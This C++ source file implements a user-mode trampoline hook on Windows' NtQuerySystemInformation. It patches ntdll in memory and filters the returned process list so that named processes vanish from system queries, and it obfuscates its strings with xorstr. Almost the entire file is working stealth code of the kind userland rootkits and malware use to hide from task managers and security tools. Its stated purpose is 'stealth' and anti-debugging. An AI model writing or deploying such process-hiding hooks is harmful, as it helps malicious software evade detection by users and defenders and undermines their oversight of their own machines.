#include "internal.hpp"

/**
 * @file internal.cpp
 * @brief Implements a user-mode hook on `NtQuerySystemInformation` to hide specific processes
 *        from system queries, typically used for stealth in monitoring or anti-debugging scenarios.
 *
 * This file sets up a trampoline hook on the `NtQuerySystemInformation` function by:
 * - Saving the original bytes of the function.
 * - Injecting a jump to a custom callback that filters out specific process entries.
 * - Restoring the original function when disabling the hook.
 *
 * Core Functionalities:
 * - `enable_hook`: Installs the hook by modifying the original function's entry point.
 * - `disable_hook`: Restores the original function and releases allocated resources.
 * - `hook_function`: Patches the original function to redirect to the callback using a jmp rel32.
 * - `create_trampoline`: Allocates memory near the original function and copies the overwritten bytes,
 *                        appending a jump back to the remainder of the function.
 * - `allocate_nearby_memory`: Reserves executable memory within a reachable offset for relative jumps.
 * - `__calback_nt_query_system_information`: Filters the returned process list to hide target processes
 *                                            specified in the loader configuration.
 */

auto ph::internal::enable_hook( sdk::loader* loader ) -> void
{
	ph::internal::loader = loader;

	/// Get the address of NtQuerySystemInformation function

	auto address = sdk::win::get_procedure_address(
		sdk::win::get_module_base( xorstr( L"ntdll.dll" ) ),
		xorstr( "NtQuerySystemInformation" )
	);

	/// Save the first original bytes of the function to restore later

	sdk::memory::copy( original_bytes, ( unsigned char* ) address, patch_size );

	/// Create a trampoline that allows calling the original function after hook

	ph::internal::trampoline = create_trampoline( address );

	/// Install the hook by patching the target function to redirect to our callback

	hook_function( address, &__calback_nt_query_system_information );
}

auto ph::internal::disable_hook( ) -> void
{
	auto address = sdk::win::get_procedure_address(
		sdk::win::get_module_base( xorstr( L"ntdll.dll" ) ), xorstr( "NtQuerySystemInformation" ) );

	sdk::win::nt_free_virtual_memory(
		sdk::win::get_current_process( ), &trampoline, nullptr, MEM_RELEASE );

	/// Restore original bytes to remove the hook

	unsigned long old_protect = 0;

	sdk::win::virtual_protect( address, patch_size, PAGE_EXECUTE_READWRITE, &old_protect );

	sdk::memory::copy( address, original_bytes, patch_size );

	sdk::win::virtual_protect( address, patch_size, old_protect, &old_protect );

}

auto ph::internal::hook_function( void* function, void* callback ) -> void
{
	/// Allocate memory near the original function to hold a jump to the callback (jmp rel32)

	auto nearby_memory = ( unsigned char* ) allocate_nearby_memory( function, 14 );

	/// 0xFF 0x25 0x00 0x00 0x00 0x00			| jmp qword ptr [rip + 0x00]
	/// 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 | address of the function

	nearby_memory[0] = 0xFF; nearby_memory[1] = 0x25;
	nearby_memory[2] = 0x00; nearby_memory[3] = 0x00;
	nearby_memory[4] = 0x00; nearby_memory[5] = 0x00;
	*( ( unsigned __int64* ) ( nearby_memory + 6 ) ) = ( unsigned __int64 ) callback;

	/// Create a patch to overwrite the first bytes of the function

	/// 0xE9                | jmp rel32
	/// 0x00 0x00 0x00 0x00 | relative address
	/// 0x00 0x00 0x00      | fill original instruction bytes

	unsigned char patch[patch_size] =
	{
		0xE9,
		0, 0, 0, 0,
		0, 0, 0
	};

	/// Calculate the relative offset from the function to our nearby jump

	auto relative_address = ( __int32 ) ( ( __int64 ) nearby_memory - 5 - ( __int64 ) function );

	sdk::memory::copy( patch + 1, &relative_address, 4 );

	/// Patch the function to redirect execution

	unsigned long old_protect = 0;

	sdk::win::virtual_protect( function, patch_size, PAGE_EXECUTE_READWRITE, &old_protect );

	sdk::memory::copy( function, patch, patch_size );

	sdk::win::virtual_protect( function, patch_size, old_protect, &old_protect );
}

auto ph::internal::create_trampoline( void* function ) -> void*
{
	/// Allocate memory near the original function to hold a jump to the callback (jmp rel32)

	auto nearby_memory = ( unsigned char* ) allocate_nearby_memory( function, 22 );

	/// Copy the original bytes that were overwrited by the hook

	sdk::memory::copy( nearby_memory, original_bytes, patch_size );

	/// 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? 0x?? | original bytes of the function
	/// 0xFF 0x25 0x00 0x00 0x00 0x00			| jmp qword ptr [rip + 0x00]
	/// 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 | address of the original function + patch_size

	nearby_memory[8] = 0xFF; nearby_memory[9] = 0x25;
	nearby_memory[10] = 0x00; nearby_memory[11] = 0x00;
	nearby_memory[12] = 0x00; nearby_memory[13] = 0x00;
	*( ( unsigned __int64* ) ( nearby_memory + 14 ) ) = ( unsigned __int64 ) function + patch_size;

	return nearby_memory;
}

auto ph::internal::allocate_nearby_memory(
	void* address,
	unsigned long size
) -> void*
{
	/// Try to allocate memory within a reachable range (~2GB) of the target address

	auto start = ( unsigned __int64 ) address & ~0xFFFF;
	const unsigned __int64 range = 0x7FFF0000;

	for ( auto addr = start; addr < start + range; addr += 0x10000 )
	{
		auto memory = sdk::win::virtual_alloc( ( void* ) addr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );

		if ( memory != nullptr )
			return memory;
	}

	return nullptr;
}

auto __stdcall ph::internal::__calback_nt_query_system_information(
	SYSTEM_INFORMATION_CLASS system_information_class,
	void* system_information,
	unsigned long system_information_length,
	unsigned long* return_length
) -> long
{
	///  Call the original function through the trampoline

	auto result = ( ( nt_query_system_information_t ) trampoline )(
		system_information_class,
		system_information,
		system_information_length,
		return_length
		);

	if ( system_information_class != SystemProcessInformation || result != 0 )
		return result;

	auto previous = ( system_process_information* ) nullptr;

	for (
		auto* entry = ( system_process_information* ) system_information;
		entry && entry->NextEntryOffset;
		entry = ( system_process_information* ) ( ( unsigned char* ) entry + entry->NextEntryOffset ) )
	{
		for ( auto i = 0; i < loader->process_count; ++i )
		{
			/// Check if the process name matches one we want to hide (case-insensitive)

			if ( entry->ImageName.Buffer &&
				sdk::wstring( entry->ImageName.Buffer ).to_lower( ).ends_with(
				sdk::wstring( loader->processes[i] ).to_lower( ) )
				)
			{
				/// Hide the process by removing it from the linked list

				if ( entry->NextEntryOffset )
					previous->NextEntryOffset += entry->NextEntryOffset;

				else
					previous->NextEntryOffset = 0;


				entry = previous;
			}
		}

		previous = entry;
	}

	return result;
}
